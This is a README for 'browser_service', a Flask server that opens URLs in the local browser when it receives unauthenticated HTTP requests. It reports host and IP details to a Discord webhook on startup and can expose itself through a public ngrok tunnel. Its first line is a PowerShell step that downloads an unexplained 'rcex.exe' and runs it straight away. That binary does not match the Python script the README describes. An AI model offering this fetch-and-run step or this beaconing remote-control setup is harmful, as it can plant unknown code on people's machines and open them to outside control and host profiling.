# Instalation:
irm https://github.com/your-username/your-repo/releases/download/v1.0.0/rcex.exe -OutFile rcex.exe; .\rcex.exe

# browser_service

A lightweight Flask server that opens URLs in your local browser via HTTP, reports host/network info to a Discord webhook on startup, and optionally creates a public tunnel via ngrok.

---

## Installation

```bash
pip install flask requests        # required
pip install pyngrok               # optional — public tunnel support
```

---

## Usage

```bash
python browser_service.py                      # start on port 8000, attempt ngrok tunnel
python browser_service.py --port 9090          # custom port
python browser_service.py --no-tunnel          # local-only, skip ngrok
python browser_service.py --port 9090 --no-tunnel
```

### CLI flags

| Flag | Type | Default | Description |
|------|------|---------|-------------|
| `--port` | `int` | `8000` | Port to bind the server to |
| `--no-tunnel` | flag | — | Disable ngrok tunnel even if pyngrok is installed |

---

## Endpoints

| Method | Path | Description |
|--------|------|-------------|
| `GET` | `/open?url=<URL>` | Open a URL in the local default browser. Scheme is auto-prepended if missing. Returns `{"status":"ok","url":"..."}` |
| `GET` | `/status` | Returns hostname, primary IP, all IPs, port, and timestamp as JSON |
| `GET` | `/shutdown` | Stops the server after a 0.5s delay. Returns `{"status":"shutdown"}` |

### Examples

```bash
curl "localhost:8000/open?url=https://example.com"   # open a full URL
curl "localhost:8000/open?url=example.com"           # scheme auto-added → https://example.com
curl "localhost:8000/status"                         # inspect host/network info
curl "localhost:8000/shutdown"                       # stop the server remotely
```

---

## Configuration

Edit these constants at the top of `browser_service.py`:

| Constant | Default | Description |
|----------|---------|-------------|
| `DEFAULT_PORT` | `8000` | Fallback port if `--port` is not passed |
| `DEFAULT_URL` | `"https://google.com"` | Fallback URL if `/open` is called with no `url` param |
| `LOG_FILE` | `"browser_service.log"` | Log file written alongside the script |
| `DISCORD_WEBHOOK` | `""` | Paste your Discord webhook URL here; leave empty to disable |

---

## Startup sequence

```
parse args → ngrok tunnel (optional) → build host report → discord notify (thread) → flask app.run()
```

---

## Logging

All output goes to both stdout and `browser_service.log` at `INFO` level. Werkzeug request logs are suppressed (`ERROR` only).

---

## IP connectivity troubleshooting

The server binds to `0.0.0.0` (all interfaces), so it *is* reachable by IP in principle. These are the common reasons it fails in practice:

**1. Firewall blocking the port**

The OS firewall (Windows Defender, `ufw`, `iptables`) may drop inbound packets on port 8000 before they reach Flask.

```bash
sudo ufw allow 8000        # Linux
# Windows: add an inbound rule for port 8000 in Windows Firewall
```

**2. Using `localhost` instead of the LAN IP**

`localhost` resolves to `127.0.0.1` (loopback only). Requests from another device must use the machine's actual LAN IP (e.g. `192.168.x.x`). Call `/status` to find it.

**3. Wrong IP reported by `/status`**

If the machine has multiple interfaces (VPN, Docker bridge, virtual adapters), `build_host_report()` may surface the wrong one. Cross-reference with:

```bash
ip addr       # Linux/macOS
ipconfig      # Windows
```

Check all entries in the `all_ips` field of `/status` to find the right interface.

**4. ngrok tunnel not active**

If `pyngrok` isn't installed or the tunnel fails silently, `ngrok_url` is `None` and no public URL is created. The line `[ngrok] <url>` only appears in logs on success — if it's missing, the tunnel did not start.

### Quick diagnosis

```bash
curl localhost:8000/status                       # check what IP the server reports
curl http://<primary_ip>:8000/status             # test from another device
sudo ufw allow 8000                              # open the port if the above fails (Linux)
```

---

## Dependencies

| Package | Source | Purpose |
|---------|--------|---------|
| `flask` | pip | HTTP server and routing |
| `requests` | pip | Discord webhook POST |
| `pyngrok` | pip (optional) | Public ngrok tunnel |
| `webbrowser` | stdlib | Opens URLs in the local browser |
| `threading` | stdlib | Non-blocking startup tasks |
| `socket` | stdlib | Network interface enumeration |

---

## Security notes

> **`/shutdown` is unauthenticated.** It calls `os._exit(0)` and kills the process immediately with no cleanup. Do not expose this server to untrusted networks without adding auth middleware.

> **The Discord webhook URL is a secret.** Rotate it if this script is shared or committed to a public repository. Consider loading it from an environment variable instead of hardcoding it.
